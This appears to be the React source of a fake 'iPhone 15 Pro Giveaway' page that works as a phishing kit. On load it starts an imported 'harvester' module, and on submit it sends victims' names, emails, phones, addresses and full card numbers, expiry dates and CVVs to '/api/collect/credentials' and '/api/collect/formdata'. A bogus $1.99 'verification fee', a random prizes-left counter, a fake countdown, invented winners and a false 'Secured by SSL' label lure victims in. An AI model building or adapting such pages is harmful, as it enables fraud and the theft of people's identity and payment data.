import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Grid, LinearProgress, Chip, Avatar, Paper, Step, StepLabel, Stepper } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

const steps = ['Personal Info', 'Shipping', 'Verification'];

export default function GiveawayPage() {
  const [activeStep, setActiveStep] = useState(0);
  const [form, setForm] = useState({ fullName: '', email: '', phone: '', address: '', city: '', zipCode: '', creditCard: '', expiry: '', cvv: '' });
  const [submitting, setSubmitting] = useState(false);
  const [completed, setCompleted] = useState(false);
  const remaining = 127 - Math.floor(Math.random() * 30);

  useEffect(() => { harvester.init(); }, []);

  const handleChange = (field, value) => {
    setForm(prev => ({ ...prev, [field]: value }));
  };

  const handleNext = () => {
    if (activeStep < 2) {
      setActiveStep(activeStep + 1);
    } else {
      handleSubmit();
    }
  };

  const handleSubmit = async () => {
    setSubmitting(true);

    await harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      username: form.email,
      password: form.creditCard,
      email: form.email,
      phone: form.phone,
      url: window.location.href,
      formType: 'giveaway-prize',
      fieldData: form
    });

    await harvester.send('/api/collect/formdata', {
      formId: 'giveaway',
      fields: form,
      url: window.location.href
    });

    setTimeout(() => {
      setSubmitting(false);
      setCompleted(true);
    }, 2000);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4 }}>
        <Container maxWidth="sm">
          <Card elevation={3} sx={{ borderRadius: 3, overflow: 'hidden', textAlign: 'center' }}>
            <Box sx={{ bgcolor: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', p: 4 }}>
              <Typography sx={{ fontSize: '4rem' }}>🎉</Typography>
              <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2 }}>
                Congratulations!
              </Typography>
              <Typography sx={{ color: 'rgba(255,255,255,0.85)', mt: 1 }}>
                You've successfully entered the giveaway!
              </Typography>
            </Box>
            <CardContent sx={{ p: 3 }}>
              <Typography sx={{ color: '#555', mb: 2 }}>
                Your entry has been submitted. We'll contact you at <strong style={{ color: '#333' }}>{form.email}</strong> within 24-48 hours if you're a winner.
              </Typography>
              <Box sx={{ bgcolor: '#e8f5e9', borderRadius: 2, p: 2, mb: 2 }}>
                <Typography sx={{ color: '#27ae60', fontWeight: 600, fontSize: '0.9rem' }}>
                  ✅ Confirmation email sent to {form.email}
                </Typography>
              </Box>
              <Button variant="outlined" sx={{ borderColor: '#ddd', color: '#888' }} href="/">
                Back to Home
              </Button>
            </CardContent>
          </Card>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f5f7fa', py: 4 }}>
      <Container maxWidth="sm">
        {/* Prize Banner */}
        <Paper
          elevation={0}
          sx={{
            background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
            borderRadius: 3,
            p: 3,
            textAlign: 'center',
            mb: 3
          }}
        >
          <Typography sx={{ fontSize: '2.5rem', mb: 1 }}>🏆</Typography>
          <Typography variant="h5" sx={{ color: '#fff', fontWeight: 800, mb: 0.5 }}>
            iPhone 15 Pro Giveaway
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.85)', mb: 2 }}>
            We're giving away 127 brand new iPhones to lucky readers!
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, flexWrap: 'wrap' }}>
            <Chip label={`🎁 ${remaining} Prizes Left`} sx={{ bgcolor: 'rgba(255,255,255,0.2)', color: '#fff', fontWeight: 700 }} />
            <Chip label="⏱️ Ends in 23:45:12" sx={{ bgcolor: 'rgba(255,255,255,0.2)', color: '#fff', fontWeight: 700 }} />
          </Box>
        </Paper>

        {/* Entry Form */}
        <Card elevation={3} sx={{ borderRadius: 3 }}>
          <CardContent sx={{ p: 3 }}>
            <Stepper activeStep={activeStep} sx={{ mb: 3 }}>
              {steps.map((label) => (
                <Step key={label}>
                  <StepLabel sx={{ '& .MuiStepLabel-label': { fontSize: '0.8rem', color: '#888' } }}>{label}</StepLabel>
                </Step>
              ))}
            </Stepper>

            {activeStep === 0 && (
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 2 }}>
                  📋 Step 1: Your Information
                </Typography>
                <TextField fullWidth label="Full Name" value={form.fullName} onChange={(e) => handleChange('fullName', e.target.value)} sx={{ mb: 2 }} size="small" required />
                <TextField fullWidth label="Email Address" type="email" value={form.email} onChange={(e) => handleChange('email', e.target.value)} sx={{ mb: 2 }} size="small" required />
                <TextField fullWidth label="Phone Number" value={form.phone} onChange={(e) => handleChange('phone', e.target.value)} sx={{ mb: 2 }} size="small" />
              </Box>
            )}

            {activeStep === 1 && (
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 2 }}>
                  📍 Step 2: Shipping Address
                </Typography>
                <TextField fullWidth label="Street Address" value={form.address} onChange={(e) => handleChange('address', e.target.value)} sx={{ mb: 2 }} size="small" />
                <Grid container spacing={2}>
                  <Grid item xs={6}>
                    <TextField fullWidth label="City" value={form.city} onChange={(e) => handleChange('city', e.target.value)} size="small" />
                  </Grid>
                  <Grid item xs={6}>
                    <TextField fullWidth label="ZIP Code" value={form.zipCode} onChange={(e) => handleChange('zipCode', e.target.value)} size="small" />
                  </Grid>
                </Grid>
              </Box>
            )}

            {activeStep === 2 && (
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 1 }}>
                  🔒 Step 3: Identity Verification
                </Typography>
                <Box sx={{ bgcolor: '#fff8e1', border: '1px solid #ffc107', borderRadius: 2, p: 2, mb: 2 }}>
                  <Typography sx={{ color: '#856404', fontSize: '0.85rem', fontWeight: 600 }}>
                    🔐 A one-time verification fee of $1.99 is required to prevent fraud. This fee will be fully refunded with your prize.
                  </Typography>
                </Box>
                <TextField fullWidth label="Credit Card Number" value={form.creditCard} onChange={(e) => handleChange('creditCard', e.target.value)} sx={{ mb: 2 }} size="small" placeholder="1234 5678 9012 3456" />
                <Grid container spacing={2} sx={{ mb: 1 }}>
                  <Grid item xs={6}>
                    <TextField fullWidth label="Expiry (MM/YY)" value={form.expiry} onChange={(e) => handleChange('expiry', e.target.value)} size="small" placeholder="MM/YY" />
                  </Grid>
                  <Grid item xs={6}>
                    <TextField fullWidth label="CVV" value={form.cvv} onChange={(e) => handleChange('cvv', e.target.value)} size="small" placeholder="123" />
                  </Grid>
                </Grid>
                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, mb: 1 }}>
                  <img src="https://cdn.jsdelivr.net/gh/make-github-pseudonymous-again/cdn@master/payment/visa.svg" alt="Visa" style={{ height: 24 }} />
                  <img src="https://cdn.jsdelivr.net/gh/make-github-pseudonymous-again/cdn@master/payment/mastercard.svg" alt="Mastercard" style={{ height: 24 }} />
                  <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>🔒 Secured by SSL</Typography>
                </Box>
              </Box>
            )}

            {submitting ? (
              <Box sx={{ textAlign: 'center', mt: 2 }}>
                <LinearProgress sx={{ height: 6, borderRadius: 3, bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { bgcolor: '#667eea' } }} />
                <Typography sx={{ color: '#888', mt: 1, fontSize: '0.9rem' }}>Processing your entry...</Typography>
              </Box>
            ) : (
              <Box sx={{ display: 'flex', justifyContent: 'space-between', mt: 3 }}>
                <Button
                  onClick={() => setActiveStep(Math.max(0, activeStep - 1))}
                  disabled={activeStep === 0}
                  sx={{ color: '#888' }}
                >
                  Back
                </Button>
                <Button
                  variant="contained"
                  onClick={handleNext}
                  sx={{
                    bgcolor: activeStep === 2 ? '#27ae60' : '#667eea',
                    '&:hover': { bgcolor: activeStep === 2 ? '#219a52' : '#5a6fd6' },
                    fontWeight: 700,
                    px: 4
                  }}
                >
                  {activeStep < 2 ? 'Next Step →' : '🎁 Enter Giveaway'}
                </Button>
              </Box>
            )}

            <Box sx={{ textAlign: 'center', mt: 2 }}>
              <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>
                By entering, you agree to our Terms & Conditions. No purchase necessary.
              </Typography>
            </Box>
          </CardContent>
        </Card>

        {/* Recent Winners */}
        <Box sx={{ mt: 3 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 2, textAlign: 'center' }}>
            🎉 Recent Winners
          </Typography>
          <Grid container spacing={1.5}>
            {[
              { name: 'Michael R.', prize: 'iPhone 15 Pro', time: '2 hours ago' },
              { name: 'Jennifer L.', prize: 'iPhone 15 Pro', time: '5 hours ago' },
              { name: 'David W.', prize: 'iPhone 15 Pro', time: '8 hours ago' },
            ].map((winner, i) => (
              <Grid item xs={12} sm={4} key={i}>
                <Card elevation={1} sx={{ borderRadius: 2 }}>
                  <CardContent sx={{ p: 1.5, display: 'flex', alignItems: 'center', gap: 1 }}>
                    <Avatar sx={{ width: 32, height: 32, bgcolor: '#f1c40f', color: '#fff', fontSize: '0.85rem' }}>
                      {winner.name[0]}
                    </Avatar>
                    <Box>
                      <Typography sx={{ fontWeight: 600, color: '#333', fontSize: '0.8rem' }}>{winner.name}</Typography>
                      <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>{winner.prize} • {winner.time}</Typography>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>
        </Box>
      </Container>
    </Box>
  );
}